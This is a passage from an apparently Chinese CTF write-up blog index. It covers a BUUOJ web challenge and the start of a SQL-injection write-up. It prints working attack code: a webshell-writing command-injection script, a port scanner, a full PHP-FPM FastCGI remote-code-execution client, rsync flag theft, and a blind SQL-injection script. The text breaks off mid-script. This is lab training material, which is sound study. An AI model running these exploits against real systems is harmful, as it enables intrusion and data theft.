class=\"string\">r&#x27;&gt;\\$_GET\\[c\\]\\)&#x27;</span>, <span class=\"string\">r&quot;&gt;\\;\\&#x27;\\&gt;2.php&quot;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> filename:</span><br><span class=\"line\">        my_params = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;cmd&#x27;</span>: i</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        r = requests.get(base_url, params=my_params)</span><br><span class=\"line\">        print(i, r.status_code)</span><br><span class=\"line\"></span><br><span class=\"line\">    cmd_list = [<span class=\"string\">&#x27;ls -tr&gt;1.sh&#x27;</span>, <span class=\"string\">&#x27;sh 1.sh&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> cmd_list:</span><br><span class=\"line\">        exec_cmd2(i)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    write_webshell()</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;ok&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\r\n<p>访问/sandbox/XXX/2.php即可拿到Shell。我们cat /flag发现是个假的。下一步扫一下内网。Hint中提示我们可以用Python3。然而发现脚本太慢了，我就手动扫了，做题时服务器IP是172.64.152.3，然后发现172.64.152.4有HTTP回应。我们扫端口。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">foo</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">&#x27;active_port.txt&#x27;</span>,<span class=\"string\">&#x27;at&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">65535</span>+<span class=\"number\">1</span>):</span><br><span class=\"line\">            ip = <span class=\"string\">&#x27;172.64.152.4&#x27;</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">                s.connect((ip,i))</span><br><span class=\"line\">                s.close()</span><br><span class=\"line\">                f.writelines(str(i)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">except</span> socket.error:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\">        f.close()</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    foo()</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;ok&#x27;</span>)</span><br></pre></td></tr></table></figure>\r\n<p>然后发现80 873 9000端口开放。873对应Rsync，9000对应FPM。我们先试试9000的FPM漏洞。参考<a href=\"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\">这个</a>。ExP如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class=\"line\"></span><br><span class=\"line\">PY2 = <span class=\"literal\">True</span> <span class=\"keyword\">if</span> sys.version_info.major == <span class=\"number\">2</span> <span class=\"keyword\">else</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bchr</span>(<span class=\"params\">i</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> PY2:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> force_bytes(chr(i))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bytes([i])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bord</span>(<span class=\"params\">c</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> isinstance(c, int):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> c</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ord(c)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">force_bytes</span>(<span class=\"params\">s</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> isinstance(s, bytes):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>, <span class=\"string\">&#x27;strict&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">force_text</span>(<span class=\"params\">s</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> issubclass(type(s), str):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s</span><br><span class=\"line\">    <span class=\"keyword\">if</span> isinstance(s, bytes):</span><br><span class=\"line\">        s = str(s, <span class=\"string\">&#x27;utf-8&#x27;</span>, <span class=\"string\">&#x27;strict&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        s = str(s)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FastCGIClient</span>:</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># private</span></span><br><span class=\"line\">    __FCGI_VERSION = <span class=\"number\">1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    __FCGI_ROLE_RESPONDER = <span class=\"number\">1</span></span><br><span class=\"line\">    __FCGI_ROLE_AUTHORIZER = <span class=\"number\">2</span></span><br><span class=\"line\">    __FCGI_ROLE_FILTER = <span class=\"number\">3</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    __FCGI_TYPE_BEGIN = <span class=\"number\">1</span></span><br><span class=\"line\">    __FCGI_TYPE_ABORT = <span class=\"number\">2</span></span><br><span class=\"line\">    __FCGI_TYPE_END = <span class=\"number\">3</span></span><br><span class=\"line\">    __FCGI_TYPE_PARAMS = <span class=\"number\">4</span></span><br><span class=\"line\">    __FCGI_TYPE_STDIN = <span class=\"number\">5</span></span><br><span class=\"line\">    __FCGI_TYPE_STDOUT = <span class=\"number\">6</span></span><br><span class=\"line\">    __FCGI_TYPE_STDERR = <span class=\"number\">7</span></span><br><span class=\"line\">    __FCGI_TYPE_DATA = <span class=\"number\">8</span></span><br><span class=\"line\">    __FCGI_TYPE_GETVALUES = <span class=\"number\">9</span></span><br><span class=\"line\">    __FCGI_TYPE_GETVALUES_RESULT = <span class=\"number\">10</span></span><br><span class=\"line\">    __FCGI_TYPE_UNKOWNTYPE = <span class=\"number\">11</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    __FCGI_HEADER_SIZE = <span class=\"number\">8</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># request state</span></span><br><span class=\"line\">    FCGI_STATE_SEND = <span class=\"number\">1</span></span><br><span class=\"line\">    FCGI_STATE_ERROR = <span class=\"number\">2</span></span><br><span class=\"line\">    FCGI_STATE_SUCCESS = <span class=\"number\">3</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, host, port, timeout, keepalive</span>):</span></span><br><span class=\"line\">        self.host = host</span><br><span class=\"line\">        self.port = port</span><br><span class=\"line\">        self.timeout = timeout</span><br><span class=\"line\">        <span class=\"keyword\">if</span> keepalive:</span><br><span class=\"line\">            self.keepalive = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.keepalive = <span class=\"number\">0</span></span><br><span class=\"line\">        self.sock = <span class=\"literal\">None</span></span><br><span class=\"line\">        self.requests = dict()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__connect</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        self.sock.settimeout(self.timeout)</span><br><span class=\"line\">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># if self.keepalive:</span></span><br><span class=\"line\">        <span class=\"comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class=\"line\">        <span class=\"comment\"># else:</span></span><br><span class=\"line\">        <span class=\"comment\">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            self.sock.connect((self.host, int(self.port)))</span><br><span class=\"line\">        <span class=\"keyword\">except</span> socket.error <span class=\"keyword\">as</span> msg:</span><br><span class=\"line\">            self.sock.close()</span><br><span class=\"line\">            self.sock = <span class=\"literal\">None</span></span><br><span class=\"line\">            print(repr(msg))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__encodeFastCGIRecord</span>(<span class=\"params\">self, fcgi_type, content, requestid</span>):</span></span><br><span class=\"line\">        length = len(content)</span><br><span class=\"line\">        buf = bchr(FastCGIClient.__FCGI_VERSION) \\</span><br><span class=\"line\">               + bchr(fcgi_type) \\</span><br><span class=\"line\">               + bchr((requestid &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">               + bchr(requestid &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">               + bchr((length &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">               + bchr(length &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">               + bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">               + bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">               + content</span><br><span class=\"line\">        <span class=\"keyword\">return</span> buf</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__encodeNameValueParams</span>(<span class=\"params\">self, name, value</span>):</span></span><br><span class=\"line\">        nLen = len(name)</span><br><span class=\"line\">        vLen = len(value)</span><br><span class=\"line\">        record = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> nLen &lt; <span class=\"number\">128</span>:</span><br><span class=\"line\">            record += bchr(nLen)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record += bchr((nLen &gt;&gt; <span class=\"number\">24</span>) | <span class=\"number\">0x80</span>) \\</span><br><span class=\"line\">                      + bchr((nLen &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr((nLen &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr(nLen &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> vLen &lt; <span class=\"number\">128</span>:</span><br><span class=\"line\">            record += bchr(vLen)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record += bchr((vLen &gt;&gt; <span class=\"number\">24</span>) | <span class=\"number\">0x80</span>) \\</span><br><span class=\"line\">                      + bchr((vLen &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr((vLen &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xFF</span>) \\</span><br><span class=\"line\">                      + bchr(vLen &amp; <span class=\"number\">0xFF</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> record + name + value</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__decodeFastCGIHeader</span>(<span class=\"params\">self, stream</span>):</span></span><br><span class=\"line\">        header = dict()</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;version&#x27;</span>] = bord(stream[<span class=\"number\">0</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;type&#x27;</span>] = bord(stream[<span class=\"number\">1</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;requestId&#x27;</span>] = (bord(stream[<span class=\"number\">2</span>]) &lt;&lt; <span class=\"number\">8</span>) + bord(stream[<span class=\"number\">3</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class=\"number\">4</span>]) &lt;&lt; <span class=\"number\">8</span>) + bord(stream[<span class=\"number\">5</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class=\"number\">6</span>])</span><br><span class=\"line\">        header[<span class=\"string\">&#x27;reserved&#x27;</span>] = bord(stream[<span class=\"number\">7</span>])</span><br><span class=\"line\">        <span class=\"keyword\">return</span> header</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__decodeFastCGIRecord</span>(<span class=\"params\">self, buffer</span>):</span></span><br><span class=\"line\">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> header:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            record = self.__decodeFastCGIHeader(header)</span><br><span class=\"line\">            record[<span class=\"string\">&#x27;content&#x27;</span>] = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;contentLength&#x27;</span> <span class=\"keyword\">in</span> record.keys():</span><br><span class=\"line\">                contentLength = int(record[<span class=\"string\">&#x27;contentLength&#x27;</span>])</span><br><span class=\"line\">                record[<span class=\"string\">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;paddingLength&#x27;</span> <span class=\"keyword\">in</span> record.keys():</span><br><span class=\"line\">                skiped = buffer.read(int(record[<span class=\"string\">&#x27;paddingLength&#x27;</span>]))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> record</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">request</span>(<span class=\"params\">self, nameValuePairs=&#123;&#125;, post=<span class=\"string\">&#x27;&#x27;</span></span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> self.__connect():</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">    </span><br><span class=\"line\">        requestId = random.randint(<span class=\"number\">1</span>, (<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">16</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        self.requests[requestId] = dict()</span><br><span class=\"line\">        request = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">        beginFCGIRecordContent = bchr(<span class=\"number\">0</span>) \\</span><br><span class=\"line\">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\</span><br><span class=\"line\">                                 + bchr(self.keepalive) \\</span><br><span class=\"line\">                                 + bchr(<span class=\"number\">0</span>) * <span class=\"number\">5</span></span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class=\"line\">                                              beginFCGIRecordContent, requestId)</span><br><span class=\"line\">        paramsRecord = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> nameValuePairs:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (name, value) <span class=\"keyword\">in</span> nameValuePairs.items():</span><br><span class=\"line\">                name = force_bytes(name)</span><br><span class=\"line\">                value = force_bytes(value)</span><br><span class=\"line\">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> paramsRecord:</span><br><span class=\"line\">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class=\"string\">b&#x27;&#x27;</span>, requestId)</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> post:</span><br><span class=\"line\">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class=\"line\">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class=\"string\">b&#x27;&#x27;</span>, requestId)</span><br><span class=\"line\">    </span><br><span class=\"line\">        self.sock.send(request)</span><br><span class=\"line\">        self.requests[requestId][<span class=\"string\">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class=\"line\">        self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>] = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.__waitForResponse(requestId)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__waitForResponse</span>(<span class=\"params\">self, requestId</span>):</span></span><br><span class=\"line\">        data = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            buf = self.sock.recv(<span class=\"number\">512</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> len(buf):</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            data += buf</span><br><span class=\"line\">    </span><br><span class=\"line\">        data = BytesIO(data)</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            response = self.__decodeFastCGIRecord(data)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> response:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \\</span><br><span class=\"line\">                    <span class=\"keyword\">or</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class=\"line\">                    self.requests[<span class=\"string\">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class=\"line\">                <span class=\"keyword\">if</span> requestId == int(response[<span class=\"string\">&#x27;requestId&#x27;</span>]):</span><br><span class=\"line\">                    self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>] += response[<span class=\"string\">&#x27;content&#x27;</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> response[<span class=\"string\">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class=\"line\">                self.requests[requestId]</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.requests[requestId][<span class=\"string\">&#x27;response&#x27;</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__repr__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.format(self.host, self.port)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;host&#x27;</span>, help=<span class=\"string\">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;file&#x27;</span>, help=<span class=\"string\">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;-c&#x27;</span>, <span class=\"string\">&#x27;--code&#x27;</span>, help=<span class=\"string\">&#x27;What php code your want to execute&#x27;</span>, default=<span class=\"string\">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;-p&#x27;</span>, <span class=\"string\">&#x27;--port&#x27;</span>, help=<span class=\"string\">&#x27;FastCGI port&#x27;</span>, default=<span class=\"number\">9000</span>, type=int)</span><br><span class=\"line\"></span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\">    </span><br><span class=\"line\">    client = FastCGIClient(args.host, args.port, <span class=\"number\">3</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    params = dict()</span><br><span class=\"line\">    documentRoot = <span class=\"string\">&quot;/&quot;</span></span><br><span class=\"line\">    uri = args.file</span><br><span class=\"line\">    content = args.code</span><br><span class=\"line\">    params = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class=\"string\">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REQUEST_METHOD&#x27;</span>: <span class=\"string\">&#x27;POST&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class=\"string\">&#x27;/&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class=\"line\">        <span class=\"string\">&#x27;QUERY_STRING&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class=\"line\">        <span class=\"string\">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class=\"string\">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;REMOTE_PORT&#x27;</span>: <span class=\"string\">&#x27;9985&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_ADDR&#x27;</span>: <span class=\"string\">&#x27;127.0.0.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_PORT&#x27;</span>: <span class=\"string\">&#x27;80&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_NAME&#x27;</span>: <span class=\"string\">&quot;localhost&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class=\"string\">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;CONTENT_TYPE&#x27;</span>: <span class=\"string\">&#x27;application/text&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;CONTENT_LENGTH&#x27;</span>: <span class=\"string\">&quot;%d&quot;</span> % len(content),</span><br><span class=\"line\">        <span class=\"string\">&#x27;PHP_VALUE&#x27;</span>: <span class=\"string\">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class=\"string\">&#x27;allow_url_include = On&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    response = client.request(params, content)</span><br><span class=\"line\">    print(force_text(response))</span><br></pre></td></tr></table></figure>\r\n<p>我们利用这个进行RCE。问题是我们需要知道一个目标服务器上PHP文件的绝对路径。在扫80端口的时候我们发现他有一个redirect.php。大胆猜测一下Web1和Web2的路径是一样的，都在/www下，试一下。</p>\r\n<img src=\"/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/php-fpm.png\" class=\"\" title=\"PHP-FPM RCE\">\r\n<p>看到Flag了，但是我们没有权限拿到。怎么办？我们似乎还有一个873 Rsync没有利用。参考<a href=\"https://www.jianshu.com/p/615669b7311f\">这个</a>。看一下rsync的配置。Ubuntu默认将rsync的配置保存在/etc/rsyncd.conf中。src节中将路径设置在根下，满足条件。我们用rsync拖下来flag。</p>\r\n<img src=\"/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/rsync.png\" class=\"\" title=\"RSync get flag\">\r\n<p>然后cat /tmp/7h1s_i5_f14g就可以拿到flag了。</p>\r\n\n    <div id=\"aplayer-emFHHukh\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"1992741\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{f85231ab-fe4c-46b7-801c-a9eb844b43e2}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ","Shell","PHP-FPM","RSync"]},{"title":"BUUOJ刷题-Web-简单注入","url":"/2020/08/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>BJDCTF 2nd的简单注入。</p>\r\n<p>明显注入题。</p>\r\n<p>robots.txt发现有hint.txt，hint.txt里给出查询语句<code>select * from users where username='$_POST[\"username\"]' and password='$_POST[\"password\"]';</code>，并且告诉我们要得到密码。</p>\r\n<p>过滤了一大堆东西，包括<code>select</code> <code>and</code> <code>&amp;</code> <code>\"</code> <code>'</code> <code>=</code> <code>-</code> 。</p>\r\n<p>然后介绍一种新的Payload，如果我们给username传<code>admin\\</code>会怎样？<code>select * from users where username='admin\\' and password='safasfd'</code>。<code>\\</code>转义符号会吃掉一个单引号，导致username实际上等于<code>admin' and password=</code>，我们就逃逸出一个单引号。然后盲注好了。</p>\r\n<p>很明确，要select password from users。那就很简单了，password构造<code>or ascii(substr((password),1,1))&gt;32</code>，，盲注跑脚本即可。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">url=<span class=\"string\">&quot;http://06f46304-b570-4801-aa2d-6641e91f487b.node3.buuoj.cn/&quot;</span></span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">64</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">        c=requests.post(url=url,data=&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;username&quot;</span>:<span class=\"string\">&quot;admin\\\\&quot;</span>,</span><br><span class=\"line\">            <span class=\"string\">&quot;password&quot;</span>:<span class=\"string\">&quot; or ascii(substring(password,&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.format(a,b)</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;stronger&quot;</span> <span 